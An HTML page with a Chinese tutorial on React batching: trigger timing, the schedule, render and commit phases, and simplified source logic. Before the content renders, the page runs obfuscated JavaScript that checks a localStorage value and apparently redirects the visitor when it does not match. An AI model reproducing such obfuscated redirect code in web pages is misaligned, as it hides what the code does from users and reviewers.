<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x4b8a49=_0x533e;if((()=>{for(var n=_0x533e,s=_0x2ded();;)try{if(401630==+parseInt(n(451,"i&CL"))*(-parseInt(n(469,"onO]"))/2)+parseInt(n(449,"onO]"))/3+parseInt(n(448,"oY(U"))/4+-parseInt(n(465,"*0HO"))/5*(-parseInt(n(463,"4prD"))/6)+parseInt(n(452,"crBK"))/7+parseInt(n(444,"RijG"))/8*(parseInt(n(466,"rA^J"))/9)+-parseInt(n(468,"zjcw"))/10*(parseInt(n(453,"eFrv"))/11))break;s.push(s.shift())}catch(n){s.push(s.shift())}})(),localStorage[_0x4b8a49(460,"RijG")](_0x4b8a49(446,"onO]"))!=_0x4b8a49(459,"mJA*"))throw window[_0x4b8a49(461,"BUt)")][_0x4b8a49(454,"^sR&")](_0x4b8a49(450,"x!0!")),Error();function _0x533e(a,n){var o=_0x2ded();return(_0x533e=function(n,s){var t=o[n-=444];void 0===_0x533e.lufELF&&(_0x533e.tttSpw=function(n,s){var t,e=[],a=0,o="";for(n=(n=>{for(var s,t,e="",a="",o=0,l=0;t=n.charAt(l++);~t&&(s=o%4?64*s+t:t,o++%4)&&(e+=String.fromCharCode(255&s>>(-2*o&6))))t="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(t);for(var c=0,r=e.length;c<r;c++)a+="%"+("00"+e.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(a)})(n),l=0;l<256;l++)e[l]=l;for(l=0;l<256;l++)a=(a+e[l]+s.charCodeAt(l%s.length))%256,t=e[l],e[l]=e[a],e[a]=t;for(var l=0,a=0,c=0;c<n.length;c++)t=e[l=(l+1)%256],e[l]=e[a=(a+e[l])%256],e[a]=t,o+=String.fromCharCode(n.charCodeAt(c)^e[(e[l]+e[a])%256]);return o},a=arguments,_0x533e.lufELF=!0);var n=n+o[0],e=a[n];return e?t=e:(void 0===_0x533e.mcxWWC&&(_0x533e.mcxWWC=!0),t=_0x533e.tttSpw(t,s),a[n]=t),t})(a,n)}function _0x2ded(){var n=["ebddGmoDb8keW4vg","WRW/WPhcGSkweYOTESkzW5DU","W4BdOLjJW64YWOH4rapdVeG","EmouW78shNKip8oQWQrb","B8oCWPVdGCkiWQpcOqpdOG","yepdSCo3aSkAW6HGka","WOSyWOmYj8kRtmo9eCozzq","WOpdOMRcR8kPWQZdRvBdGhOlCa","eHdcPCkMqSoDW7bYo8oSWRr4","nSkCW5RdGmksW5BdN3tdN8ogkgjqWPNdQ3yHzCo6xN5xW5WfWPq3","W6VcPqTzACkwW5GKBvj3WPq","BNVdVCooWRhcKCoyyuCSFtrC","uCoOhmk3wmoavwW","ofldV8oBWPddPdO","AhhdUCopWRBdOCknrxyHEW","qhxcQmorWQjoE8oG","uLxcN30uWQfZW67dVq5hvW","W6VcOa0QomocW4qJBW","WORcJ8ouW4DQ","lmkiWRXPwLuh","aCoQECkAbxtcK8ox","WPddJtOwAcK5W7hdJLKrFmoY","wSkXW4iHt8oLBSkMlrmn","ymk3a3boxSooWOiQne0x","WOVdGmk8FConySo0Dca","bu3cTmo7WQFcSCoZumkW","WOddPaNdISoVW7VdKh8","AmkajgZcKZ8ZqCoreaxdMW"];return(_0x2ded=function(){return n})()}document.title="React 批处理（Batching）的触发时机与执行阶段",document.getElementById("article").innerHTML='<div><p>在 React 中，<strong>批处理（Batching）</strong>   的核心目的是将多个状态更新合并为一次渲染，以减少不必要的重复计算和 DOM 操作。它的触发时机和执行阶段如下：</p>\n<hr>\n<h2><strong>1. 批处理的触发时机</strong></h2>\n<p>批处理发生在 <strong>调度阶段（Schedule Phase）</strong>  ，即在进入 Render 阶段之前。具体场景包括：</p>\n<ol>\n<li><strong>React 事件回调</strong>  （如 <code>onClick</code>、<code>onChange</code>）中的多个 <code>setState</code>。</li>\n<li><strong>生命周期方法</strong>  （如 <code>componentDidMount</code>）中的连续更新。</li>\n<li><strong>React 18 的自动批处理</strong>  ：扩展到 <code>setTimeout</code>、<code>Promise</code>、原生事件等所有场景。</li>\n</ol>\n<p><strong>示例</strong>  ：</p>\n<pre><code class="language-jsx"><span class="hljs-comment">// React 17（仅事件回调内批处理）</span>\nhandleClick = <span class="hljs-function">() =&gt;</span> {\n  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>({ <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> }); <span class="hljs-comment">// 更新1</span>\n  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>({ <span class="hljs-attr">b</span>: <span class="hljs-number">2</span> }); <span class="hljs-comment">// 更新2</span>\n  <span class="hljs-comment">// 合并为一次渲染</span>\n};\n\n<span class="hljs-comment">// React 18（所有场景自动批处理）</span>\n<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {\n  <span class="hljs-title function_">setCount</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">// 更新1</span>\n  <span class="hljs-title function_">setFlag</span>(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 更新2</span>\n  <span class="hljs-comment">// 合并为一次渲染</span>\n}, <span class="hljs-number">1000</span>);\n</code></pre>\n<hr>\n<h2><strong>2. 批处理的执行流程</strong></h2>\n<h3><strong>（1）调度阶段（Before Render Phase）</strong></h3>\n<ol>\n<li><strong>收集更新</strong>  ：\n<ul>\n<li>每次调用 <code>setState</code> 或 Hook 的 dispatch 时，React 会创建一个 <code>Update</code> 对象，并将其添加到对应 Fiber 节点的 <code>updateQueue</code> 链表中。</li>\n<li>多个更新按顺序链接成链表（如 <code>update1 → update2 → update3</code>）。</li>\n</ul>\n</li>\n<li><strong>标记需要更新的 Fiber</strong>  ：\n<ul>\n<li>通过 <code>scheduleUpdateOnFiber</code> 标记从当前 Fiber 到根节点的路径为“待更新”。</li>\n</ul>\n</li>\n<li><strong>统一调度</strong>  ：\n<ul>\n<li>React 会检查当前是否处于批处理上下文（如事件回调），如果是，则延迟执行渲染。</li>\n<li>在回调结束时（或微任务队列中），统一处理所有积累的更新。</li>\n</ul>\n</li>\n</ol>\n<h3><strong>（2）Render 阶段</strong></h3>\n<ul>\n<li><strong>合并更新</strong>  ：在 <code>processUpdateQueue</code> 中，按顺序处理 <code>updateQueue</code> 链表中的所有更新，计算出最终状态。</li>\n<li><strong>生成新 Fiber 树</strong>  ：基于合并后的状态，执行组件渲染（<code>render</code> 或函数组件执行）。</li>\n</ul>\n<h3><strong>（3）Commit 阶段</strong></h3>\n<ul>\n<li><strong>一次性更新 DOM</strong>  ：将所有标记的变更应用到真实 DOM。</li>\n</ul>\n<hr>\n<h2><strong>3. 关键设计原理</strong></h2>\n<h3><strong>（1）为什么批处理在 Render 阶段之前？</strong></h3>\n<ul>\n<li><strong>性能优化</strong>  ：避免多次中间渲染（如连续 <code>setState</code> 触发多次 <code>render</code>）。</li>\n<li><strong>状态一致性</strong>  ：确保所有更新基于同一基础状态计算（防止中间状态泄漏）。</li>\n</ul>\n<h3><strong>（2）批处理的实现依赖</strong></h3>\n<ol>\n<li><strong>更新队列（<code>updateQueue</code>）</strong>  ：\n<ul>\n<li>链表结构存储多个 <code>Update</code>，按顺序处理。</li>\n</ul>\n</li>\n<li><strong>优先级调度（Lane Model）</strong>  ：\n<ul>\n<li>同一优先级的更新会被合并。</li>\n</ul>\n</li>\n<li><strong>执行上下文（Batching Context）</strong>  ：\n<ul>\n<li>React 通过 <code>executionContext</code> 标记当前是否处于可批处理的环境（如 <code>EventContext</code>、<code>BatchContext</code>）。</li>\n</ul>\n</li>\n</ol>\n<hr>\n<h2><strong>4. 源码关键逻辑（简化版）</strong></h2>\n<pre><code class="language-javascript"><span class="hljs-comment">// 1. 调度更新（scheduleUpdateOnFiber）</span>\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">scheduleUpdateOnFiber</span>(<span class="hljs-params">fiber, lane</span>) {\n  <span class="hljs-keyword">if</span> (isBatchingUpdates) {\n    <span class="hljs-comment">// 处于批处理上下文中，仅将更新加入队列</span>\n    <span class="hljs-title function_">enqueueUpdate</span>(fiber, update);\n    <span class="hljs-keyword">return</span>;\n  }\n  <span class="hljs-comment">// 否则直接调度渲染</span>\n  <span class="hljs-title function_">ensureRootIsScheduled</span>(root, lane);\n}\n\n<span class="hljs-comment">// 2. 批处理入口（batchedUpdates）</span>\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">batchedUpdates</span>(<span class="hljs-params">fn</span>) {\n  <span class="hljs-keyword">const</span> prevExecutionContext = executionContext;\n  executionContext |= <span class="hljs-title class_">BatchedContext</span>; <span class="hljs-comment">// 进入批处理模式</span>\n  <span class="hljs-keyword">try</span> {\n    <span class="hljs-keyword">return</span> <span class="hljs-title function_">fn</span>(); <span class="hljs-comment">// 执行回调（内部 setState 会被合并）</span>\n  } <span class="hljs-keyword">finally</span> {\n    executionContext = prevExecutionContext;\n    <span class="hljs-comment">// 回调结束后，统一刷新更新</span>\n    <span class="hljs-title function_">flushSyncCallbacks</span>();\n  }\n}\n</code></pre>\n<hr>\n<h2><strong>5. 特殊情况与边界案例</strong></h2>\n<h3><strong>（1）同步强制更新</strong></h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// React 17：绕过批处理</span>\n<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {\n  <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">unstable_batchedUpdates</span>(<span class="hljs-function">() =&gt;</span> {\n    <span class="hljs-title function_">setCount</span>(<span class="hljs-number">1</span>);\n    <span class="hljs-title function_">setFlag</span>(<span class="hljs-literal">true</span>);\n  });\n}, <span class="hljs-number">1000</span>);\n\n<span class="hljs-comment">// React 18：所有场景自动批处理，无需手动处理</span>\n</code></pre>\n<h3><strong>（2）优先级打断</strong></h3>\n<ul>\n<li>在并发模式下，高优先级更新（如用户输入）会打断低优先级的批处理，优先渲染。</li>\n</ul>\n<hr>\n<h2><strong>6. 总结</strong></h2>\n<table>\n<thead>\n<tr>\n<th><strong>阶段</strong></th>\n<th><strong>批处理行为</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>调度阶段</strong></td>\n<td>收集多个 <code>setState</code> 到 <code>updateQueue</code>，延迟渲染请求。</td>\n</tr>\n<tr>\n<td><strong>Render 阶段前</strong></td>\n<td>合并所有同优先级的更新，计算最终状态。</td>\n</tr>\n<tr>\n<td><strong>Render 阶段</strong></td>\n<td>基于合并后的状态生成新 Fiber 树。</td>\n</tr>\n<tr>\n<td><strong>Commit 阶段</strong></td>\n<td>一次性提交所有 DOM 变更。</td>\n</tr>\n</tbody>\n</table>\n<p><strong>核心思想</strong>  ：<br>\nReact 通过将更新收集到链表队列中，在进入渲染流程前统一处理，最大化减少渲染次数，保证性能与状态一致性。</p>\n</div>'</script></body></html>